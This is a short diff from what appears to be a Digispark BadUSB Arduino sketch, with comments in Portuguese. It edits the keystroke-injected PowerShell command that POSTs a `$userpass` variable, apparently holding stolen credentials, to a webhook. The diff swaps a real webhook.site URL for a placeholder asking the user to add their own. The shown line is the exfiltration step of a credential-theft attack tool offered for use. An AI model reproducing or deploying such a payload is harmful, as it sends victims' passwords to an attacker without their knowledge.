@@ -48,7 +48,7 @@ void loop() {
   DigiKeyboard.delay(500);
 
   // Envia os dados para o Webhook
-  DigiKeyboard.println(F("Invoke-WebRequest -Uri \"https://webhook.site/ec44306a-36b5-474f-82d4-b8bbf63e2d17\" -Method POST -Body $userpass"));
+  DigiKeyboard.println(F("Invoke-WebRequest -Uri \"Adicione seu webhook\" -Method POST -Body $userpass"));
   DigiKeyboard.delay(500); // Atraso mais curto para enviar os dados
   
   // Finaliza a execução do script
